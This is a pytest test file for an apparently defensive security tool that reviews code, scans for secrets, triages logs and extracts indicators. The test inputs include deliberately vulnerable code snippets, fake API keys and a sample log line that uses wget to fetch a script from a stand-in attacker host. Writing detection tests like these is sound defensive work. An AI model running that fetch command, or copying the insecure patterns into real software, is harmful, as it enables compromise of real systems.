import json

from sentinel.megha import MeghaRequest, run_megha, list_capabilities


def test_capabilities():
    caps = list_capabilities()
    assert any(c["id"] == "assess_plan" for c in caps)


def test_checklist():
    r = run_megha(MeghaRequest(mode="checklist", target_type="api"))
    assert r.ok and len(r.items) >= 5


def test_code_review_flags_secrets():
    r = run_megha(MeghaRequest(mode="code_review", text="API_KEY = 'abcd'\neval(user)"))
    assert r.ok
    ids = {f["id"] for f in r.items}
    assert "hardcoded_secret" in ids or "eval_exec" in ids


def test_assess_requires_auth():
    r = run_megha(MeghaRequest(mode="assess_plan", authorized=False, scope="x"*10, attestor="t"))
    assert not r.ok


def test_assess_ok():
    r = run_megha(
        MeghaRequest(
            mode="assess_plan",
            authorized=True,
            scope="staging.example.com OWASP API top10 only",
            attestor="RedTeam",
            target_type="api",
        )
    )
    assert r.ok and r.authz and len(r.items) >= 5


def test_threat_model_stride():
    r = run_megha(MeghaRequest(mode="threat_model", text="public API with payments on AWS"))
    assert r.ok
    cats = {c["category"] for c in r.items}
    assert "Spoofing" in cats and "Elevation of privilege" in cats
    assert "Asset-specific" in cats


def test_secret_scan_detects_and_redacts():
    key = "AKIA" + "A" * 16
    r = run_megha(MeghaRequest(mode="secret_scan", text=f"aws_key = {key}\n"))
    assert r.ok
    ids = {f["id"] for f in r.items}
    assert "aws_access_key" in ids
    assert key not in r.items[0]["snippet"]  # redacted


def test_log_triage_summarizes():
    logs = "db ERROR connection refused\nWARN retry 3\nERROR connection refused\nfailed password for root\n"
    r = run_megha(MeghaRequest(mode="log_triage", text=logs))
    assert r.ok
    flat = str(r.items)
    assert "5xx" in flat and "4xx" in flat
    assert "auth_failures" in flat


def test_report_markdown():
    r = run_megha(
        MeghaRequest(
            mode="report",
            text="high: SQL injection at login\nlow: verbose error pages",
            scope="api.example.com",
        )
    )
    assert r.ok
    md = r.items[0]["markdown"]
    assert md.startswith("# Security Review")
    assert "| 1 | high |" in md
    assert "api.example.com" in md


def test_new_checklist_variants():
    for tt in ("cloud", "container", "mobile"):
        r = run_megha(MeghaRequest(mode="checklist", target_type=tt))
        assert r.ok and len(r.items) >= 6


def test_new_compliance_frameworks():
    for fw in ("soc2", "hipaa", "nist csf", "dpdp"):
        r = run_megha(MeghaRequest(mode="compliance_map", framework=fw))
        assert r.ok and r.items[0]["step"] == "context"


def test_code_review_new_rules():
    src = "requests.get(user_url)\nxml.etree.ElementTree.parse(data)\njwt.decode(token, verify=False)\n"
    r = run_megha(MeghaRequest(mode="code_review", text=src))
    assert r.ok
    ids = {f["id"] for f in r.items}
    assert "ssrf" in ids and "xxe" in ids and "jwt_weakness" in ids


def test_code_review_extended_rules_and_redos():
    src = (
        "render_template_string(tpl)\n"
        "res.redirect(req.query.next)\n"
        "md5(password)\n"
        "zipfile.extractall(dest)\n"
        "re.compile('(a+)+')\n"
    )
    r = run_megha(MeghaRequest(mode="code_review", text=src))
    ids = {f["id"] for f in r.items}
    assert {"ssti", "open_redirect", "weak_crypto", "zip_slip", "redos_risk"} <= ids


def test_code_review_detects_stack():
    src = "import fastapi\nfrom fastapi import FastAPI\napp = FastAPI()\n"
    r = run_megha(MeghaRequest(mode="code_review", text=src))
    assert any(f["id"] == "stack_detected" for f in r.items)


def test_secret_scan_high_entropy():
    r = run_megha(MeghaRequest(mode="secret_scan", text="blob: Xq7vB3nM9pL2kR8sT4wY6zA1C5dE0fG\n"))
    assert r.ok
    assert any(f["id"] == "high_entropy_string" for f in r.items)


def test_secret_scan_new_patterns():
    r = run_megha(
        MeghaRequest(
            mode="secret_scan",
            text="git push https://robot:s3cr3tpass@gitlab.example.com/repo.git\nsendgrid = SG." + "A" * 22 + "." + "B" * 43 + "\n",
        )
    )
    ids = {f["id"] for f in r.items}
    assert "basic_auth_url" in ids and "sendgrid_key" in ids


def test_log_triage_mitre_and_timeline():
    logs = (
        "2026-10-15 10:00:01 failed password for root\n"
        "2026-10-15 10:00:02 failed password for admin\n"
        "2026-10-15 10:00:03 cmd=wget http://evil.example/x.sh\n"
    )
    r = run_megha(MeghaRequest(mode="log_triage", text=logs))
    flat = str(r.items)
    assert "T1110" in flat and "T1505" in flat
    assert "timeline" in flat


def test_incident_phishing_extra_runbook():
    r = run_megha(MeghaRequest(mode="incident_triage", text="employee clicked a phishing email link"))
    flat = " ".join(str(i.get("step", "")) for i in r.items)
    assert "Preserve the original email" in flat
    assert "forwarding rules" in flat


def test_threat_model_privacy_and_boundaries():
    r = run_megha(MeghaRequest(mode="threat_model", text="health app storing personal data"))
    cats = {c["category"] for c in r.items}
    assert "Privacy (LINDDUN-lite)" in cats
    assert "Trust boundaries" in cats


def test_report_risk_score_and_csv():
    r = run_megha(MeghaRequest(mode="report", text="high: a\nhigh: b"))
    md = r.items[0]["markdown"]
    assert "Risk score: 10" in md
    csv = next(i["csv"] for i in r.items if "csv" in i)
    assert csv.splitlines()[0] == "severity,status,owner,finding"
    assert csv.count('"high"') == 2


def test_sarif_export():
    r = run_megha(MeghaRequest(mode="sarif", text="high: SQLi\ninfo: note"))
    assert r.ok
    sarif = r.items[0]["sarif"]
    assert sarif["version"] == "2.1.0"
    results = sarif["runs"][0]["results"]
    assert len(results) == 2
    assert results[0]["level"] == "error" and results[1]["level"] == "note"


def test_ioc_extract_defangs_and_classifies():
    r = run_megha(
        MeghaRequest(
            mode="ioc_extract",
            text="hit http://evil.example.com/x from 10.0.0.5 and 8.8.8.8, sha256 " + "a" * 64 + ", CVE-2026-1234",
        )
    )
    assert r.ok
    flat = json.dumps(r.items)
    assert "hxxp://evil[.]example[.]com/x" in flat
    assert "CVE-2026-1234" in flat
    ips = {i["value"]: i for i in r.items if i.get("type") == "ipv4"}
    assert ips["10[.]0[.]0[.]5"]["private"] is True
    assert ips["8[.]8[.]8[.]8"]["private"] is False


def test_ioc_extract_accepts_defanged_input():
    r = run_megha(MeghaRequest(mode="ioc_extract", text="C2 was hxxp://bad[.]top/gate and 45.77[.]12[.]9"))
    flat = json.dumps(r.items)
    assert "hxxp://bad[.]top/gate" in flat
    assert "45[.]77[.]12[.]9" in flat


def test_config_review_flags_container_risks():
    r = run_megha(
        MeghaRequest(mode="config_review", text="spec:\n  privileged: true\n  image: app:latest\n")
    )
    seen = {t["check"] for t in r.items if t["status"] == "seen"}
    assert "privileged: true" in seen
    assert ":latest" in seen
